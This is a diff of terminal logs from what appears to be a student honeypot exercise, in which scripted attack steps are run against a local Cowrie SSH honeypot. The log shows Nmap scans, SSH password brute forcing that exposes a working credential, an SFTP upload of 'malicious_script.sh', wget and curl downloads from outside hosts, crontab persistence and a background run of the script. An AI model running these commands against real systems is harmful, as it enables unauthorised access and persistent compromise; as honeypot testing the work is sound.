@@ -1,64 +1,64 @@
-dawid@DESKTOP-AK6U9OC:/mnt/d/Programowanie/studia/BECYB/honeypots$ docker run --name sshpass --link=cowrie --expose=2222 -v ./test-cases:/usr/test-cases -v ./test-cases-local:/usr/test-cases-local -it sshpass /bin/bash
+docker run --name sshpass --link=cowrie --expose=2222 -v ./test-cases:/usr/test-cases -v ./test-cases-local:/usr/test-cases-local -it sshpass /bin/bash
 bash: cannot set terminal process group (-1): Inappropriate ioctl for device
 bash: no job control in this shell
-root@c15d221145ce:/usr# export USER=marcin001
-root@c15d221145ce:/usr# export HOST=cowrie
-root@c15d221145ce:/usr# export PORT=2222
-root@c15d221145ce:/usr# export PASS=zdt7*UHB
-root@c15d221145ce:/usr# (cd test-cases-local; timeout 10s ./step1-1.sh)
-Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:32 UTC
-Initiating ARP Ping Scan at 03:32
+root@d2700a4177ee:/usr# export USER=marcin001
+ HOSTroot@d2700a4177ee:/usr# export HOST=cowrie
+root@d2700a4177ee:/usr# export PORT=2222
+root@d2700a4177ee:/usr# export PASS=zdt7*UHB
+root@d2700a4177ee:/usr# (cd test-cases-local; timeout 10s ./step1-1.sh)
+Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:41 UTC
+Initiating ARP Ping Scan at 03:41
 Scanning cowrie (172.17.0.3) [1 port]
-Completed ARP Ping Scan at 03:32, 0.26s elapsed (1 total hosts)
-Initiating SYN Stealth Scan at 03:32
+Completed ARP Ping Scan at 03:41, 0.26s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 03:41
 Scanning cowrie (172.17.0.3) [1 port]
 Discovered open port 2222/tcp on 172.17.0.3
-Completed SYN Stealth Scan at 03:32, 0.25s elapsed (1 total ports)
+Completed SYN Stealth Scan at 03:41, 0.25s elapsed (1 total ports)
 Nmap scan report for cowrie (172.17.0.3)
-Host is up (0.000093s latency).
+Host is up (0.000094s latency).
 
 PORT     STATE SERVICE
 2222/tcp open  EtherNetIP-1
 MAC Address: 02:42:AC:11:00:03 (Unknown)
 
 Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
+Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
            Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
-Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:32 UTC
-Initiating ARP Ping Scan at 03:32
+Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:41 UTC
+Initiating ARP Ping Scan at 03:41
 Scanning cowrie (172.17.0.3) [1 port]
-Completed ARP Ping Scan at 03:32, 0.26s elapsed (1 total hosts)
-Initiating SYN Stealth Scan at 03:32
+Completed ARP Ping Scan at 03:41, 0.25s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 03:41
 Scanning cowrie (172.17.0.3) [1 port]
 Discovered open port 2222/tcp on 172.17.0.3
-Completed SYN Stealth Scan at 03:32, 0.25s elapsed (1 total ports)
+Completed SYN Stealth Scan at 03:41, 0.25s elapsed (1 total ports)
 Nmap scan report for cowrie (172.17.0.3)
-Host is up (0.00013s latency).
+Host is up (0.000077s latency).
 
 PORT     STATE SERVICE
 2222/tcp open  EtherNetIP-1
 MAC Address: 02:42:AC:11:00:03 (Unknown)
 
 Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
+Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
            Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
-Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:32 UTC
+Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:41 UTC
 NSE: Loaded 4 scripts for scanning.
 NSE: Script Pre-scanning.
-Initiating NSE at 03:32
-Completed NSE at 03:32, 0.00s elapsed
-Initiating ARP Ping Scan at 03:32
+Initiating NSE at 03:41
+Completed NSE at 03:41, 0.00s elapsed
+Initiating ARP Ping Scan at 03:41
 Scanning cowrie (172.17.0.3) [1 port]
-Completed ARP Ping Scan at 03:32, 0.25s elapsed (1 total hosts)
-Initiating SYN Stealth Scan at 03:32
+Completed ARP Ping Scan at 03:41, 0.25s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 03:41
 Scanning cowrie (172.17.0.3) [1 port]
 Discovered open port 2222/tcp on 172.17.0.3
-Completed SYN Stealth Scan at 03:32, 0.25s elapsed (1 total ports)
+Completed SYN Stealth Scan at 03:41, 0.25s elapsed (1 total ports)
 NSE: Script scanning 172.17.0.3.
-Initiating NSE at 03:32
-Completed NSE at 03:32, 0.10s elapsed
+Initiating NSE at 03:41
+Completed NSE at 03:41, 0.09s elapsed
 Nmap scan report for cowrie (172.17.0.3)
-Host is up (0.000064s latency).
+Host is up (0.000068s latency).
 
 PORT     STATE SERVICE
 2222/tcp open  EtherNetIP-1
@@ -109,10 +109,10 @@ PORT     STATE SERVICE
 MAC Address: 02:42:AC:11:00:03 (Unknown)
 
 NSE: Script Post-scanning.
-Initiating NSE at 03:32
-Completed NSE at 03:32, 0.00s elapsed
+Initiating NSE at 03:41
+Completed NSE at 03:41, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
+Nmap done: 1 IP address (1 host up) scanned in 1.01 seconds
            Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
 OpenSSH_7.9p1 Debian-10+deb10u2, OpenSSL 1.1.1n  15 Mar 2022
 debug1: Reading configuration data /etc/ssh/ssh_config
@@ -201,63 +201,63 @@ debug2: we did not send a packet, disable method
 debug1: No more authentication methods to try.
 root@cowrie: Permission denied (publickey,password).
 172.17.0.3:2222 SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
-Effective host scan rate: 2.62 hosts/s
-root@c15d221145ce:/usr# (cd test-cases-local; timeout 10s ./step2-1.sh)
-Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:33 UTC
+Effective host scan rate: 33.33 hosts/s
+root@d2700a4177ee:/usr# (cd test-cases-local; timeout 10s ./step2-1.sh)
+Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:41 UTC
 NSE: Loaded 1 scripts for scanning.
 NSE: Script Pre-scanning.
-Initiating NSE at 03:33
-Completed NSE at 03:33, 0.00s elapsed
-Initiating ARP Ping Scan at 03:33
+Initiating NSE at 03:41
+Completed NSE at 03:41, 0.00s elapsed
+Initiating ARP Ping Scan at 03:41
 Scanning cowrie (172.17.0.3) [1 port]
-Completed ARP Ping Scan at 03:33, 0.33s elapsed (1 total hosts)
-Initiating SYN Stealth Scan at 03:33
+Completed ARP Ping Scan at 03:41, 0.27s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 03:41
 Scanning cowrie (172.17.0.3) [1 port]
 Discovered open port 2222/tcp on 172.17.0.3
-Completed SYN Stealth Scan at 03:33, 0.25s elapsed (1 total ports)
+Completed SYN Stealth Scan at 03:41, 0.25s elapsed (1 total ports)
 NSE: Script scanning 172.17.0.3.
-Initiating NSE at 03:33
+Initiating NSE at 03:41
 :jkaczmarskiute 172.17.0.3:2222] Trying username/password pair: jkaczmarski
 NSE: [ssh-brute 172.17.0.3:2222] Trying username/password pair: marcin001:marcin001
 :12345678-brute 172.17.0.3:2222] Trying username/password pair: jkaczmarski
 NSE: [ssh-brute 172.17.0.3:2222] Trying username/password pair: marcin001:12345678
 :zdt7*UHB-brute 172.17.0.3:2222] Trying username/password pair: jkaczmarski
 NSE: [ssh-brute 172.17.0.3:2222] Trying username/password pair: marcin001:zdt7*UHB
-Completed NSE at 03:33, 1.47s elapsed
+Completed NSE at 03:42, 1.53s elapsed
 Nmap scan report for cowrie (172.17.0.3)
-Host is up (0.00012s latency).
+Host is up (0.000051s latency).
 
 PORT     STATE SERVICE
 2222/tcp open  EtherNetIP-1
 | ssh-brute:
 |   Accounts:
 |     marcin001:zdt7*UHB - Valid credentials
-|_  Statistics: Performed 6 guesses in 1 seconds, average tps: 6.0
+|_  Statistics: Performed 6 guesses in 2 seconds, average tps: 3.0
 MAC Address: 02:42:AC:11:00:03 (Unknown)
 
 NSE: Script Post-scanning.
-Initiating NSE at 03:33
-Completed NSE at 03:33, 0.00s elapsed
+Initiating NSE at 03:42
+Completed NSE at 03:42, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
+Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds
            Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
-Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:33 UTC
+Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-29 03:42 UTC
 NSE: Loaded 1 scripts for scanning.
 NSE: Script Pre-scanning.
-Initiating NSE at 03:33
-Completed NSE at 03:33, 0.00s elapsed
-Initiating ARP Ping Scan at 03:33
+Initiating NSE at 03:42
+Completed NSE at 03:42, 0.00s elapsed
+Initiating ARP Ping Scan at 03:42
 Scanning cowrie (172.17.0.3) [1 port]
-Completed ARP Ping Scan at 03:33, 0.25s elapsed (1 total hosts)
-Initiating SYN Stealth Scan at 03:33
+Completed ARP Ping Scan at 03:42, 0.24s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 03:42
 Scanning cowrie (172.17.0.3) [1 port]
 Discovered open port 2222/tcp on 172.17.0.3
-Completed SYN Stealth Scan at 03:33, 0.25s elapsed (1 total ports)
+Completed SYN Stealth Scan at 03:42, 0.25s elapsed (1 total ports)
 NSE: Script scanning 172.17.0.3.
-Initiating NSE at 03:33
-Completed NSE at 03:33, 0.13s elapsed
+Initiating NSE at 03:42
+Completed NSE at 03:42, 0.24s elapsed
 Nmap scan report for cowrie (172.17.0.3)
-Host is up (0.000088s latency).
+Host is up (0.000085s latency).
 
 PORT     STATE SERVICE
 2222/tcp open  EtherNetIP-1
@@ -266,12 +266,12 @@ PORT     STATE SERVICE
 MAC Address: 02:42:AC:11:00:03 (Unknown)
 
 NSE: Script Post-scanning.
-Initiating NSE at 03:33
-Completed NSE at 03:33, 0.00s elapsed
+Initiating NSE at 03:42
+Completed NSE at 03:42, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
+Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
            Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
-root@c15d221145ce:/usr# (cd test-cases; timeout 5s sshpass -p "$PASS" ssh -o "StrictHostKeyChecking=no" -o "KexAlgorithms=+diffie-hellman-group1-sha1" -p "$PORT" "$USER@$HOST" < ./step3-1.sh)
+root@d2700a4177ee:/usr# (cd test-cases; timeout 5s sshpass -p "$PASS" ssh -o "StrictHostKeyChecking=no" -o "KexAlgorithms=+diffie-hellman-group1-sha1" -p "$PORT" "$USER@$HOST" < ./step3-1.sh)
 Pseudo-terminal will not be allocated because stdin is not a terminal.
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -363,7 +363,7 @@ marcin001@svr04:~$
 marcin001@svr04:~$ cat /etc/ssh/sshd_config
 cat: /etc/ssh/sshd_config: No such file or directory
 marcin001@svr04:~$
-marcin001@svr04:~$ root@c15d221145ce:/usr# (cd test-cases; timeout 5s sshpass -p "$PASS" sftp -o "StrictHostKeyChecking=ms=+diffie-hellman-group1-sha1" -P "$PORT" "$USER@$HOST" < ./step4-1.sh)
+marcin001@svr04:~$ root@d2700a4177ee:/usr# (cd test-cases; timeout 5s sshpass -p "$PASS" sftp -o "StrictHostKeyChecking=ms=+diffie-hellman-group1-sha1" -P "$PORT" "$USER@$HOST" < ./step4-1.sh)
 Connected to marcin001@cowrie.
 sftp> # [Local commands]
 sftp>
@@ -378,11 +378,11 @@ sftp>
 sftp>
 sftp> # Upload files using SFTP
 sftp>
-sftp> put ./test-cases/malicious_script.sh
-stat ./test-cases/malicious_script.sh: No such file or directory
-sftp> put ./test-cases/some_data.csv
-stat ./test-cases/some_data.csv: No such file or directory
-root@c15d221145ce:/usr# (cd test-cases; timeout 5s sshpass -p "$PASS" ssh -o "StrictHostKeyChecking=no" -o "KexAlgorithms=+diffie-hellman-group1-sha1" -p "$PORT" "$USER@$HOST" < ./step4-2.sh)
+sftp> put ./malicious_script.sh
+Uploading ./malicious_script.sh to /home/marcin001/malicious_script.sh
+sftp> put ./some_data.csv
+Uploading ./some_data.csv to /home/marcin001/some_data.csv
+root@d2700a4177ee:/usr# (cd test-cases; timeout 5s sshpass -p "$PASS" ssh -o "StrictHostKeyChecking=no" -o "KexAlgorithms=+diffie-hellman-group1-sha1" -p "$PORT" "$USER@$HOST" < ./step4-2.sh)
 Pseudo-terminal will not be allocated because stdin is not a terminal.
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -406,7 +406,7 @@ marcin001@svr04:~$
 marcin001@svr04:~$
 marcin001@svr04:~$
 marcin001@svr04:~$ wget -O hello_wget.sh https://gist.githubusercontent.com/mob-sakai/174a32b95572e7d8fdbf8e6f43a528f6/raw/1dc49460272dd4399469b295b189a520beef02f8/hello.sh
---2023-05-29 03:33:35--  https://gist.githubusercontent.com/mob-sakai/174a32b95572e7d8fdbf8e6f43a528f6/raw/1dc49460272dd4399469b295b189a520beef02f8/hello.sh
+--2023-05-29 03:42:32--  https://gist.githubusercontent.com/mob-sakai/174a32b95572e7d8fdbf8e6f43a528f6/raw/1dc49460272dd4399469b295b189a520beef02f8/hello.sh
 Connecting to gist.githubusercontent.com:None... connected.
 HTTP request sent, awaiting response...
 wget -O stetoskop_wget.jpg http://sklep.kamed.com.pl/uploaded/products/classic_0002_180.jpg
@@ -425,7 +425,7 @@ curl -o stetoskop_curl.jpg http://sklep.kamed.com.pl/uploaded/products/classic_0
 
 curl -o deck_curl.csv https://gist.githubusercontent.com/garrettgman/9629323/raw/ee5dfc039fd581cb467cc69c226ea2524913c3d8/deck.csv
 
-root@c15d221145ce:/usr# (cd test-cases; timeout 5s sshpass -p "$PASS" ssh -o "StrictHostKeyChecking=no" -o "KexAlgorithms=+diffie-hellman-group1-sha1" -p "$PORT" "$USER@$HOST" < ./step5-1.sh)
+root@d2700a4177ee:/usr# (cd test-cases; timeout 5s sshpass -p "$PASS" ssh -o "StrictHostKeyChecking=no" -o "KexAlgorithms=+diffie-hellman-group1-sha1" -p "$PORT" "$USER@$HOST" < ./step5-1.sh)
 Pseudo-terminal will not be allocated because stdin is not a terminal.
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -533,5 +533,5 @@ marcin001@svr04:~$ (crontab -l; echo -n "0 4 8-14 * * "; echo -n ~/hello.sh) | c
 
 ~/malicious_script.sh &
 
-root@c15d221145ce:/usr# exit
+root@d2700a4177ee:/usr# exit
 exit
